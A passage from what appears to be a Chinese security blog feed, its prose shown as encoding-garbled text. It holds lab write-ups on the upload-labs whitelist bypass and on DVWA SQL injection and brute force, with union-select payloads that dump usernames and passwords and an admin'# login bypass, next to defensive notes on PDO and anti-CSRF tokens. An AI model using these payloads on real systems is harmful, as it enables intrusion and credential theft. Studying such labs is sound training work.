ä¸Š<code>.</code>ä½¿å¾—<code>pathinfo()</code>è·å–åˆ°çš„<code>PATHINFO_EXTENSION</code>ä¸ºç©ºï¼Œä»è€Œç»•è¿‡é»‘åå•ã€‚</p><h1>Pass-21ï¼ˆç™½åå•éªŒè¯-æ•°ç»„ç»•è¿‡)</h1><p>å…ˆæ£€æŸ¥MIMEç±»å‹(æ”¹<code>Content-Type</code>)ï¼Œç„¶ååˆ¤æ–­<code>save_name</code>å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±æŠŠæ–‡ä»¶åç§°èµ‹å€¼ç»™<code>$file</code>,å¦åˆ™å°†<code>save_name</code>å‚æ•°çš„å€¼èµ‹ç»™å®ƒã€‚ç„¶ååˆ¤æ–­<code>$file</code>æ˜¯å¦æ˜¯æ•°ç»„.ä¸æ˜¯å°±ç”¨<code>explode()</code>å‡½æ•°é€šè¿‡<code>.</code>å·åˆ†å‰²æˆæ•°ç»„,å–æœ€åä¸€ä¸ªåç¼€åï¼Œè¿›è¡Œç™½åå•éªŒè¯ã€‚ä¸ç¬¦åˆå°±æŠ¥é”™ï¼Œç¬¦åˆå°±æ‹¼æ¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªä½œä¸ºæ–‡ä»¶åï¼Œä¿å­˜ã€‚</p><p><code>explode()</code> å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚è¯¦æƒ…ï¼š<a href="https://www.w3school.com.cn/php/func_string_explode.asp">explode()</a></p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reset</span><span class="hljs-params">(array &amp;<span class="hljs-variable">$array</span>)</span></span><span class="hljs-comment">//å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ</span></code></pre><p>ç»•è¿‡<code>explode()</code>å‡½æ•°ï¼šä¼ å…¥æ•°ç»„ï¼Œç»•è¿‡ç™½åå•ï¼Œç”±äºå–çš„æ˜¯æ•°ç»„æœ€åä¸€ä¸ªï¼Œæ‰€ä»¥ä¼ å…¥æ•°ç»„çš„æœ€åä¸€ä¸ªè¦ä¸º<code>jpg|png|gif</code>ï¼Œç„¶åæ‹¼æ¥æ–‡ä»¶åï¼Œå–<code>reset()</code>ç¬¬ä¸€ä¸ªï¼Œå³ç´¢å¼•ä¸º0ï¼Œå’Œç´¢å¼•<code>count()-1</code>ï¼ˆæ•°ç»„å†…å…ƒç´ ä¸ªæ•°-1ï¼‰ã€‚æ‰€ä»¥ç´¢å¼•0åº”ä¸º<code>.php</code>ï¼Œç´¢å¼•3ä¸º<code>jpg</code>ï¼ˆç´¢å¼•1ä¹‹åå³å¯ï¼‰ï¼Œè¿™æ ·æ•°ç»„å…ƒç´ ä¸ªæ•°ä¸º2ï¼Œæ‹¼æ¥çš„å°±æ˜¯ç´¢å¼•0å’Œç´¢å¼•1å³<code>.php</code>å’Œç©ºï¼Œç»“æœè¿˜æ˜¯<code>.php</code></p><img src="/2021/01/24/upload/29.jpg" alt="29" style="zoom:67%;"><p>æˆåŠŸ~~</p><img src="/2021/01/24/upload/28.jpg" alt="28" style="zoom:33%;"><h1>æ€»ç»“</h1><p><strong>upload-labs</strong>é¶åœºæä¾›äº†è®¸å¤šç»•è¿‡æ–¹å¼ï¼Œä½†éƒ½è¾ƒä¸ºç®€å•çš„ï¼Œå®æˆ˜ä¸­ä¼šé‡åˆ°æ›´å¤æ‚çš„ç»•è¿‡æ–¹å¼ï¼Œæœ‰å¯èƒ½æ˜¯å¤šç§éªŒè¯å¹¶å­˜ï¼Œæ•…æ€è·¯ä¸èƒ½å±€é™ï¼Œäº‰å–ä¸€å…³å¤šè§£ï¼Œå…¶å®è¿™ä¸ªé¶åœºè·Ÿsqli-labsæœ‰ç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½æ˜¯å…ˆé€ä¸ªä»‹ç»å„ç§éªŒè¯æ–¹å¼ï¼Œå†é€æ­¥ç»¼åˆåˆ°ä¸€ä¸ªå…³å¡é‡Œã€‚ä½†è§£é¢˜è¿‡ç¨‹æŠŠæç¤ºï¼Œæºä»£ç çœ‹å¾—å·®ä¸å¤šäº†.â€¦â€¦è¿˜è¿‡åˆ†ä¾èµ–é€šå…³æ‰‹å†Œâ€¦â€¦è¦åæ€ï¼ï¼é¶åœºè¿˜æ˜¯å¾ˆå¥½ç©çš„~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||SQLæ³¨å…¥andSQLç›²æ³¨</title>
    <link href="/2021/01/22/dvwa/"/>
    <url>/2021/01/22/dvwa/</url>
    
    <content type="html"><![CDATA[<h1>dvwa</h1><h2 id="SQL-Injection"><a class="header-anchor" href="#SQL-Injection">ğŸ­</a>SQL Injection</h2><h4 id="low"><a class="header-anchor" href="#low">ğŸ­</a>low</h4><p>å…ˆæŒ‘ç†Ÿæ‚‰çš„sqlæ³¨å…¥ä¸‹æ‰‹ï¼Œå•å¼•å·æ³¨å…¥,æŠ¥é”™ï¼š<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''admin''' at line 1</code>æ¨æµ‹ä¸ºå•å¼•å·æ³¨å…¥ï¼ŒæŸ¥çœ‹æºä»£ç :</p><p><img src="/2021/01/22/dvwa/3.jpg" alt="3"></p><p>ç¡®å®šä¸ºå•å¼•å·æ³¨å…¥ï¼Œæºä»£ç ä¸­ç”¨äº†<code>$_REQUESTè·å–idå‚æ•°ï¼Œ$_REQUEST åŒ…å«äº† $_GETï¼Œ$_POST å’Œ $_COOKIE </code>çš„æ•°ç»„ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œå¼€å§‹æŸ¥å­—æ®µï¼š</p><p><code>1' order by 2#</code>å›æ˜¾æ­£å¸¸:</p><p><img src="/2021/01/22/dvwa/4.jpg" alt="4"></p><p><code> 1' order by 3#</code>æ˜¾ç¤º<code>Unknown column '3' in 'order clause'</code>æ•…æœ‰ä¸¤ä¸ªå­—æ®µï¼Œæ¥ä¸‹æ¥æŸ¥å›æ˜¾ä½ç½®<code>1' union select 1,2# </code>:</p><p><img src="/2021/01/22/dvwa/2.jpg" alt="2"></p><p>æœ‰ä¸¤ä¸ªæ˜¾ç¤ºä½ã€‚</p><p>æŸ¥æ•°æ®åº“:</p><p><code>1' union select 1,database()#</code></p><p><img src="/2021/01/22/dvwa/5.jpg" alt="5"></p><p>æŸ¥è¡¨:</p><p><code>1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</code>å›æ˜¾ï¼š<code>Illegal mix of collations for operation 'UNION'</code>,ç™¾åº¦çš„è¯´æ³•æ˜¯å­—ç¬¦é›†åŠæ•°æ®è¡¨å­—æ®µç¼–ç å­—ç¬¦ä¸ä¸€è‡´å¯¼è‡´çš„ï¼Œä¸æ˜¯å¾ˆæ‡‚è¿™æ¡è¯­å¥æœ‰ä»€ä¹ˆç¼–ç é—®é¢˜ï¼Œè¯•è¯•æ”¹ä¸º16è¿›åˆ¶è¯»å–ï¼š</p><p><code>1' union select 1,hex (group_concat(table_name) )from information_schema.tables where table_schema=database() #</code></p><p><img src="/2021/01/22/dvwa/6.jpg" alt="6"></p><p><code>6775657374626F6F6B2C7573657273</code>hexè§£ç åå°±æ˜¯<code>guestbook,users</code></p><p>æŸ¥åˆ—ï¼š</p><p><code>1' union select 1,hex(group_concat(column_name)) from information_schema.columns where table_name='users' #</code></p><p><img src="/2021/01/22/dvwa/7.jpg" alt="7"></p><p>hexè§£ç åä¸º:<code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</code></p><p>æŸ¥æ•°æ®:</p><p><code>1' union select user,password from users#</code>or<code>1' union select 1,group_concat(user,0x3a,password) from users#</code>éƒ½å¯ä»¥</p><p><img src="/2021/01/22/dvwa/1.jpg" alt="1"></p><h4 id="medium"><a class="header-anchor" href="#medium">ğŸ­</a>medium</h4><p><img src="/2021/01/22/dvwa/8.jpg" alt="8"></p><p>ä¸€æ‰“å¼€å°±è¿™æ ·???å»ç™¾åº¦å„ç§æŸ¥ï¼Œæ¢PHPç‰ˆæœ¬ï¼Œæ”¹å›¾ç¤ºè·¯å¾„çš„ä»£ç â€¦â€¦å„ç§æ–¹æ³•éƒ½è¯•äº†ï¼Œè¿˜æ˜¯è¿™ä¸ªé¡µé¢ï¼Œåˆä¸æƒ³åˆ æ‰é‡æ­ï¼Œç„¶åå°±å»è™šæ‹Ÿæœºæ­,è™šæ‹Ÿæœºè¿˜ä¸ä¼šç”¨ï¼Œæ­ä¸ªé¶åœºæ­äº†2å°æ—¶â€¦â€¦9(ä¸»è¦æ˜¯æ‰¾ä¸åˆ°åœ¨è™šæ‹Ÿæœºä¸Šç”¨å°çš®é¢æ¿æ­dvwaçš„æ•™ç¨‹)å„ç§æŠ¥é”™ï¼Œç»å†å„ç§æ›²æŠ˜ç»ˆäºæ­å¥½äº†</p><p><img src="/2021/01/22/dvwa/9.jpg" alt="9"></p><p>æœ¬å…³ä¸èƒ½è¾“å…¥è¯­å¥ï¼ŒæŸ¥çœ‹æºç ï¼Œæ˜¯POSTæäº¤ï¼Œä¸”ä½¿ç”¨<code>mysqli_real_escape_string()</code>(å‰ä¸¤ä¸ªé¶åœºç¢°åˆ°å¾ˆå¤šæ¬¡äº†ï¼Œä¸å†ä»‹ç»)è¿‡æ»¤,æœ¬å…³æ˜¯POSTæ–¹æ³•æäº¤è¡¨å•æ•…å¯ä»¥æŠ“åŒ…ä¿®æ”¹å‚æ•°ã€‚æ­¥éª¤ä¸å†èµ˜è¿°ï¼Œè¦æ³¨æ„<strong>å•å¼•å·ä¼šè¢«è½¬ä¹‰ï¼Œé‡åˆ°unionè¯­å¥æœ‰å•å¼•å·çš„å¯åˆ©ç”¨è¿›åˆ¶è½¬æ¢è¿›è¡Œç»•è¿‡</strong>ã€‚</p><h4 id="high"><a class="header-anchor" href="#high">ğŸ­</a>high</h4><p>æ‰“å¼€æ˜¯ä¸€ä¸ªé“¾æ¥ï¼Œç‚¹å¼€è·³è½¬åˆ°ä¸€ä¸ªsessioné¡µé¢ï¼ŒæŸ¥çœ‹æºç å¹¶æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤</p><img src="/2021/01/22/dvwa/10.jpg" alt="10" style="zoom:50%;"><p>highæºç ä¸­ï¼Œåœ¨sessionè¾“å…¥çš„idä¹Ÿä¸åšå¤„ç†ï¼Œå°±ç›¸å½“äºlowçš„sqlâ€¦â€¦</p><h4 id="impossible"><a class="header-anchor" href="#impossible">ğŸ­</a>impossible</h4><p>æŸ¥çœ‹æºç </p><p><img src="/2021/01/22/dvwa/11.jpg" alt="11"></p><p>é˜²æ­¢CSRFæ”»å‡»</p><pre><code class="hljs pgsql">CSRFï¼šè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ã€‚CSRFæ”»å‡»è€…åœ¨ç”¨æˆ·ç™»å½•ç›®æ ‡ç½‘ç«™ä¹‹åï¼Œè¯±ä½¿ç”¨æˆ·è®¿é—®ä¸€ä¸ªæ”»å‡»é¡µé¢ï¼Œåˆ©ç”¨ç›®æ ‡ç½‘ç«™å¯¹ç”¨æˆ·çš„ä¿¡ä»»ï¼Œä»¥ç”¨æˆ·èº«ä»½åœ¨æ”»å‡»é¡µé¢å¯¹ç›®æ ‡ç½‘ç«™å‘èµ·ä¼ªé€ ç”¨æˆ·æ“ä½œçš„è¯·æ±‚ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚CSRFæ”»å‡»æ˜¯æºäºWebçš„éšå¼èº«ä»½éªŒè¯æœºåˆ¶ã€‚Webçš„èº«ä»½éªŒè¯æœºåˆ¶è™½ç„¶å¯ä»¥ä¿è¯ä¸€ä¸ªè¯·æ±‚æ˜¯æ¥è‡ªäºæŸä¸ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œä½†å´æ— æ³•ä¿è¯è¯¥è¯·æ±‚æ˜¯ç”¨æˆ·æ‰¹å‡†å‘é€çš„ã€‚åº”å¯¹CSRFçš„æ–¹æ³•ï¼š    å°½é‡ä½¿ç”¨POSTï¼Œé™åˆ¶<span class="hljs-keyword">GET</span>    æµè§ˆå™¨Cookieç­–ç•¥    åŠ éªŒè¯ç     Referer <span class="hljs-keyword">Check</span>     Anti CSRF Token</code></pre><p>æœ¬å…³é‡‡ç”¨æœ€åä¸€ç§ï¼Œè‡³äº<code>token</code>,åœ¨æš´åŠ›ç ´è§£çš„impossibleç­‰çº§æˆ‘è¯¦ç»†ä»‹ç»è¿‡äº†ã€‚PSï¼šè²Œä¼¼å…¨é¢ä¸€ç‚¹çš„é˜²å¾¡éƒ½ä¼šç”¨åˆ°<code>token</code></p><p>Tokenä¸€èˆ¬ç”¨åœ¨ä¸¤ä¸ªåœ°æ–¹:</p><ul><li>é˜²æ­¢è¡¨å•é‡å¤æäº¤ï¼šæœåŠ¡å™¨ç«¯ç¬¬ä¸€æ¬¡éªŒè¯ç›¸åŒè¿‡å,Tokenå€¼ä¼šæ›´æ–°ã€‚è‹¥ç”¨æˆ·é‡å¤æäº¤ï¼Œç¬¬äºŒæ¬¡çš„éªŒè¯åˆ¤æ–­å°†å¤±è´¥ï¼Œå› ä¸ºç”¨æˆ·æäº¤çš„è¡¨å•ä¸­çš„Tokenæ²¡å˜ï¼Œä½†æœåŠ¡å™¨ç«¯sessionä¸­Tokenå·²ç»æ”¹å˜äº†ã€‚</li><li>anti csrfæ”»å‡»ï¼ˆè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ ï¼‰ï¼šæœåŠ¡å™¨ç«¯ä¼šå¯¹Tokenå€¼è¿›è¡ŒéªŒè¯ï¼Œåˆ¤æ–­æ˜¯å¦å’Œsessionä¸­çš„Tokenå€¼ç›¸ç­‰ã€‚è‹¥ç›¸ç­‰ï¼Œåˆ™å¯ä»¥è¯æ˜è¯·æ±‚æœ‰æ•ˆï¼Œä¸æ˜¯ä¼ªé€ çš„ã€‚</li></ul><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">( <span class="hljs-variable">$data</span>-&gt;rowCount()</span></span> == <span class="hljs-number">1</span> ) <span class="hljs-comment">//é™åˆ¶äº†åªå…è®¸è¿”å›ä¸€æ¡æ•°æ®</span></code></pre><p><img src="/2021/01/22/dvwa/12.jpg" alt="12"></p><p>PDOå¯ä»¥é˜²æ­¢sqlæ³¨å…¥</p><ul><li>æŸ¥è¯¢ä»…éœ€è§£æï¼ˆæˆ–é¢„å¤„ç†ï¼‰ä¸€æ¬¡ï¼Œä½†å¯ä»¥ç”¨ç›¸åŒæˆ–ä¸åŒçš„å‚æ•°æ‰§è¡Œå¤šæ¬¡ã€‚å½“æŸ¥è¯¢å‡†å¤‡å¥½åï¼Œæ•°æ®åº“å°†åˆ†æã€ç¼–è¯‘å’Œä¼˜åŒ–æ‰§è¡Œè¯¥æŸ¥è¯¢çš„è®¡åˆ’ã€‚å¯¹äºå¤æ‚çš„æŸ¥è¯¢ï¼Œæ­¤è¿‡ç¨‹è¦èŠ±è´¹è¾ƒé•¿çš„æ—¶é—´ï¼Œå¦‚æœéœ€è¦ä»¥ä¸åŒå‚æ•°å¤šæ¬¡é‡å¤ç›¸åŒçš„æŸ¥è¯¢ï¼Œé‚£ä¹ˆè¯¥è¿‡ç¨‹å°†å¤§å¤§é™ä½åº”ç”¨ç¨‹åºçš„é€Ÿåº¦ã€‚é€šè¿‡ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼Œå¯ä»¥é¿å…é‡å¤åˆ†æ/ç¼–è¯‘/ä¼˜åŒ–å‘¨ æœŸã€‚ç®€è¨€ä¹‹ï¼Œé¢„å¤„ç†è¯­å¥å ç”¨æ›´å°‘çš„èµ„æºï¼Œå› è€Œè¿è¡Œå¾—æ›´å¿«ã€‚</li><li>æä¾›ç»™é¢„å¤„ç†è¯­å¥çš„å‚æ•°ä¸éœ€è¦ç”¨å¼•å·æ‹¬èµ·æ¥ï¼Œé©±åŠ¨ç¨‹åºä¼šè‡ªåŠ¨å¤„ç†ã€‚å¦‚æœåº”ç”¨ç¨‹åºåªä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼Œå¯ä»¥ç¡®ä¿ä¸ä¼šå‘ç”ŸSQL æ³¨å…¥ã€‚ï¼ˆç„¶è€Œï¼Œå¦‚æœæŸ¥è¯¢çš„å…¶ä»–éƒ¨åˆ†æ˜¯ç”±æœªè½¬ä¹‰çš„è¾“å…¥æ¥æ„å»ºçš„ï¼Œåˆ™ä»å­˜åœ¨ SQL æ³¨å…¥çš„é£é™©ï¼‰ã€‚</li></ul><p>è¯¦æƒ…è§ï¼š<a href="https://www.cnblogs.com/leezhxing/p/5282437.html">PDOé˜²SQLæ³¨å…¥åŸç†åˆ†æ</a></p><h2 id="SQL-Injection-v2"><a class="header-anchor" href="#SQL-Injection-v2">ğŸ­</a>SQL Injection</h2><h3 id="low-v2"><a class="header-anchor" href="#low-v2">ğŸ­</a>low</h3><p>è¯•æ¢</p><p><img src="/2021/01/22/dvwa/13.jpg" alt="13"></p><p>å•å¼•å·æ³¨å…¥ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ€è·¯è®²è¿‡äº†ï¼Œä¹Ÿå¯ä»¥ç”¨sqlmapè·‘ã€‚</p><h3 id="medium-v2"><a class="header-anchor" href="#medium-v2">ğŸ­</a>medium</h3><p>POSTå‹ï¼ŒæŠ“åŒ…ï¼ŒF12éƒ½å¯ï¼Œ</p><p>æºä»£ç ä¸­ç”¨äº†<code>mysql_escape_string()</code>å¯¹å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ ç­‰è¿‡æ»¤ï¼Œç¢°åˆ°è¿‡æ»¤çš„å­—ç¬¦è®°å¾—è¿›åˆ¶è½¬æ¢ä¸€ä¸‹ï¼Œæ­¥éª¤ä¸å†èµ˜è¿°ã€‚</p><h3 id="high-v2"><a class="header-anchor" href="#high-v2">ğŸ­</a>high</h3><p>å°†æ“ä½œé¡µé¢å’Œæ˜¾ç¤ºé¡µé¢åˆ†å¼€ï¼Œå°†æäº¤çš„å€¼ä¼ é€’åˆ°æ˜¾ç¤ºé¡µé¢çš„cookieå­—æ®µä¸­ã€‚</p><p>sqlè¯­å¥ä¸­å¢åŠ äº†<code>limit 1</code>:é™å®šäº†è¾“å‡ºç»“æœæ¡æ•°ã€‚</p><pre><code class="hljs angelscript"><span class="hljs-comment">// Might sleep a random amount</span>       <span class="hljs-keyword">if</span>( rand( <span class="hljs-number">0</span>, <span class="hljs-number">5</span> ) == <span class="hljs-number">3</span> ) &#123;           sleep( rand( <span class="hljs-number">2</span>, <span class="hljs-number">4</span> ) );       &#125;</code></pre><p>éšæœºæ‰§è¡Œsleep()å‡½æ•°ï¼Œå»¶è¿Ÿçš„æ—¶é—´æ˜¯éšæœºåœ¨2-4sï¼Œè¿™ä¼šæ—¶é—´ç›²æ³¨æµ‹è¯•é€ æˆå¹²æ‰°ï¼Œæ•…æœ¬å…³å¯ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p><h3 id="impossible-v2"><a class="header-anchor" href="#impossible-v2">ğŸ­</a>impossible</h3><p><code>is_numeric()</code>é™åˆ¶æ•°å­—æŸ¥è¯¢,<code>Anti-CSRF token</code>é˜²å¾¡,<code>PDO</code>é˜²SQLæ³¨å…¥,sqlè¯­å¥çš„<code>limit 1</code>è¿™äº›å®¶ä¼™åˆå‡ºç°äº†ï¼Œä¸èµ˜è¿°è¾½~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA||Brute Force</title>
    <link href="/2020/12/26/dvwa%E4%BA%8C/"/>
    <url>/2020/12/26/dvwa%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1>dvwa</h1><h2 id="Brute-Force"><a class="header-anchor" href="#Brute-Force">ğŸ­</a>Brute Force</h2><h4 id="low"><a class="header-anchor" href="#low">ğŸ­</a>low</h4><h3 id="æš´åŠ›ç ´è§£ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š"><a class="header-anchor" href="#æš´åŠ›ç ´è§£ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š">ğŸ­</a>æš´åŠ›ç ´è§£ï¼ŒæŸ¥çœ‹æºä»£ç ï¼š</h3><p><img src="/2020/12/26/dvwa%E4%BA%8C/2.jpg" alt="2"></p><p>å®ƒçš„selectè¯­å¥æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œå¯ä»¥å°è¯•sqlæ³¨å…¥æ„é€ <code>admin'#</code>å¯†ç ä¸ºç©ºï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/3.jpg" alt="3"></p><p>æˆåŠŸ~~ä½†è¿™å…³æ ‡é¢˜ä¸ºæš´åŠ›ç ´è§£ï¼Œæ‰€ä»¥è¦æŒ‰æš´åŠ›ç ´è§£åšä¸€éï¼š</p><p>æŠ“åŒ…,å‘åˆ°intruder,å…ˆclear ï¼Œé€‰ä¸­è¦çˆ†ç ´å­—æ®µ,æ·»åŠ ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/1.jpg" alt="1"></p><p>åœ¨payloadä¸­é€‰æ‹©å­—å…¸ï¼Œè¯»å–ï¼ˆå­—å…¸å¾ˆå¤§è¯»å–äº†å¥½ä¹…ï¼‰ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/5.jpg" alt="5"></p><p>å¯è®¾ç½®çº¿ç¨‹æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨é»˜è®¤ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/6.jpg" alt="6"></p><p>ä¸Šå›¾æ˜¯æˆ‘è®¾ç½®çš„çº¿ç¨‹æ•°ï¼ˆçº¿ç¨‹æ•°ä¸»è¦æ˜¯è®¾ç½®ä¸€äº›é‡è¯•æ—¶é—´ï¼Œå¼€å§‹æ—¶é—´ï¼Œçº¿ç¨‹æ•°é‡ç­‰æ•°æ®ï¼‰ï¼Œå°±ç„¶åå°±å¯ä»¥å¼€å§‹ç ´è§£ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/4.jpg" alt="4"></p><p>lengthå¯ä»¥å¯¹å“åº”åŒ…çš„é•¿åº¦è¿›è¡Œæ’åºï¼Œæ‰¾æœ€å¤§æˆ–æœ€å°çš„å€¼ï¼ˆ<strong>å“åº”æŠ¥æ–‡ä¸ä¸€æ ·ï¼Œå¯†ç æ­£ç¡®å’Œé”™è¯¯è¿”å›çš„ä¸æ˜¯åŒä¸€ä¸ªå“åº”æŠ¥æ–‡ï¼Œå…¶é•¿åº¦ä¸€èˆ¬éƒ½ä¸åŒï¼Œæ•…æ‰¾å‡ºä¸åŒçš„ä¸€é¡¹ï¼Œå°±å¯ä»¥æ‰¾å‡ºæ­£ç¡®çš„ä¸€é¡¹</strong>)ç„¶åçœ‹è¿™ä¸ªHTTPè¯·æ±‚çš„å“åº”æŠ¥æ–‡ï¼š</p><img src="/2020/12/26/dvwa%E4%BA%8C/8.jpg" alt="8" style="zoom:50%;"><p>æŠ¥æ–‡ä¸­<code>welcome to the password protected area admin</code>è¡¨ç¤ºæˆåŠŸç™»å½•ã€‚</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/9.jpg" alt="9"></p><h3 id="medium"><a class="header-anchor" href="#medium">ğŸ­</a>medium</h3><p>æŸ¥çœ‹æºç :</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/10.jpg" alt="10"></p><p>å¯¹ä¼ è¿‡æ¥çš„å€¼ï¼Œä½¿ç”¨äº† <code>mysql_real_escape_string()</code> å‡½æ•°ï¼Œè½¬ä¹‰äº†ä»¥ä¸‹å­—ç¬¦ï¼š</p><pre><code class="hljs text">\x00 \n \r \ &#x27; &quot; \x1a</code></pre><p>è¿˜ä½¿ç”¨äº†sleep(2)åœ¨å¯†ç é”™è¯¯çš„æ—¶å€™å»¶æ—¶ä¸¤ç§’ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/11.jpg" alt="11"></p><p>ä¸lowç­‰çº§ç±»ä¼¼ï¼Œä½†è½¬ä¹‰äº†å¾ˆå¤šå­—ç¬¦ä¸èƒ½å†ç”¨SQLæ³¨å…¥ï¼Œæš´åŠ›ç ´è§£ä¸å‰é¢æ“ä½œä¸€æ ·ã€‚</p><h3 id="high"><a class="header-anchor" href="#high">ğŸ­</a>high</h3><p>æŸ¥çœ‹æºç ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/22.jpg" alt="22"></p><p>å‘ç°ç™»å½•éªŒè¯æ—¶æäº¤äº†usernameã€passwordã€loginã€user_tokenå‚æ•°ï¼ŒæœåŠ¡å™¨è¿”å›ç™»é™†é¡µé¢æ—¶åŒ…å«ä¸€ä¸ªéšæœºçš„user_tokençš„å€¼ï¼Œæ¯æ¬¡ç™»å½•æ—¶éƒ½è¦å°†user_tokenä¸€èµ·æäº¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œä¼šå…ˆéªŒè¯tokenï¼Œå†è¿›è¡ŒsqlæŸ¥è¯¢ã€‚æœ¬å…³è¿˜ä½¿ç”¨äº†<a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">stripslashes</a>å‡½æ•°ï¼ˆå»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œçº¿å­—ç¬¦,å¦‚æœæœ‰ä¸¤ä¸ªè¿ç»­çš„åæ–œçº¿,åˆ™åªå»æ‰ä¸€ä¸ªï¼‰ï¼Œ<code> mysql_real_escape_string</code>å¯¹å‚æ•°usernameã€passwordè¿›è¡Œè¿‡æ»¤ã€è½¬ä¹‰,æŠµå¾¡sqlæ³¨å…¥ã€‚è¿˜æ˜¯ä½¿ç”¨æŠ“åŒ…ï¼Œç­‰å­¦ä¼špythonå†ç”¨è„šæœ¬åšä¸€éã€‚</p><h4 id="æŠ“åŒ…"><a class="header-anchor" href="#æŠ“åŒ…">ğŸ­</a>æŠ“åŒ…</h4><p>burp suite æœ‰å››ç§æ”»å‡»æ¨¡å¼ï¼Œä¹‹å‰è®²åˆ°çš„æŠ“åŒ…ä¸­éƒ½ä½¿ç”¨ç‹™å‡»æ‰‹æ¨¡å¼ï¼Œå› ä¸ºåªéœ€çˆ†ç ´ä¸€ä¸ªä½ç½®ï¼Œæœ¬å…³éœ€è¦ä¸¤ä¸ªçˆ†ç ´ä½ç½®æ•…é€‰æ‹©è‰å‰æ¨¡å¼ï¼ˆè‰å‰æ¨¡å¼å…è®¸ä½¿ç”¨å¤šç»„payloadç»„åˆï¼Œåœ¨æ¯ä¸ªæ ‡è®°ä½ç½®ä¸Šéå†æ‰€æœ‰payloadç»„åˆ)å…³äºæ”»å‡»æ¨¡å¼è¯¦ç»†çœ‹æ•™ç¨‹ï¼š<a href="https://www.cnblogs.com/diligenceday/p/12316899.html">æ”»å‡»æ¨¡å¼</a></p><h4 id="è®¾ç½®å˜é‡"><a class="header-anchor" href="#è®¾ç½®å˜é‡">ğŸ­</a>è®¾ç½®å˜é‡</h4><h4 id="12"><a class="header-anchor" href="#12">ğŸ­</a><img src="/2020/12/26/dvwa%E4%BA%8C/12.jpg" alt="12"></h4><h4 id="è®¾ç½®çº¿ç¨‹"><a class="header-anchor" href="#è®¾ç½®çº¿ç¨‹">ğŸ­</a>è®¾ç½®çº¿ç¨‹</h4><p>å› ä¸ºè‰å‰æ¨¡å¼åªå…è®¸å•çº¿ç¨‹ï¼Œæ•…çº¿ç¨‹è¦è®¾ä¸ºä¸€ã€‚</p><h4 id="è®¾ç½®options"><a class="header-anchor" href="#è®¾ç½®options">ğŸ­</a>è®¾ç½®options</h4><p>Grep-Extractæå–å“åº”æ¶ˆæ¯ä¸­çš„æœ‰ç”¨ä¿¡æ¯ï¼Œæ·»åŠ è®¾ç½®ï¼š</p><img src="/2020/12/26/dvwa%E4%BA%8C/15.jpg" alt="15" style="zoom:50%;"><p>é€‰ä¸­valueå€¼è¡¨ç¤ºæ¯æ¬¡ä»å“åº”ä¸­è·å¾—è¯¥å€¼ï¼Œå°†Redirectionsè®¾ç½®ä¸ºAlwaysã€‚</p><h4 id="è®¾ç½®payloads"><a class="header-anchor" href="#è®¾ç½®payloads">ğŸ­</a>è®¾ç½®payloads</h4><p>ç¬¬ä¸€ä¸ªå‚æ•°ä¸å†èµ˜è¿°</p><img src="/2020/12/26/dvwa%E4%BA%8C/5-1610728925860.jpg" alt="5" style="zoom:50%;"><p>ç¬¬äºŒä¸ªå‚æ•°</p><img src="/2020/12/26/dvwa%E4%BA%8C/14.jpg" alt="14" style="zoom:50%;"><p>çº¢çº¿éƒ¨åˆ†ä¸ºoptionsä¸­å¤åˆ¶çš„tokenå€¼ã€‚</p><h4 id="çˆ†ç ´"><a class="header-anchor" href="#çˆ†ç ´">ğŸ­</a>çˆ†ç ´</h4><p><img src="/2020/12/26/dvwa%E4%BA%8C/13.jpg" alt="13"></p><h3 id="impossible"><a class="header-anchor" href="#impossible">ğŸ­</a>impossible</h3><p>è¿™ä¸ªæºä»£ç æœ‰ç‚¹å¤æ‚ï¼š</p><p><img src="/2020/12/26/dvwa%E4%BA%8C/16.jpg" alt="16"></p><p><img src="/2020/12/26/dvwa%E4%BA%8C/17.jpg" alt="17"><img src="/2020/12/26/dvwa%E4%BA%8C/18.jpg" alt="18"></p><p>æœ¬å…³ä¸€æ 